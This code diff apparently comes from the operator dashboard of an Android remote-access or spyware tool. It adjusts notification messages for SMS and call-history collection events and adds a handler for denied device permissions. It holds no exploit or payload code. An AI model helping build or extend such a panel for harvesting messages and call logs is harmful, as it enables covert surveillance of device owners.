@@ -88,17 +88,22 @@ App.service('BotService', ['$http', function($http) {
     })
 
     socket.on('getmessages:started', function(device) {
-      toastr.info('Get SMS started..', device.device)
+      toastr.info('Get SMS started.', device.device)
     })
     socket.on('getmessages:done', function(device) {
       toastr.info('Done getting SMS.', device.device)
     })
 
     socket.on('getcallhistory:started', function(device) {
-      toastr.info('Get call history started..', device.device)
+      toastr.info('Get call history started.', device.device)
     })
     socket.on('getcallhistory:done', function(device) {
       toastr.info('Done getting call history.', device.device)
+    })
+
+    socket.on('nopermission', function(data) {
+      console.log(data)
+      toastr.error('App is denied a permission: ' + data.permission, data.device)
     })
 
     return socket;
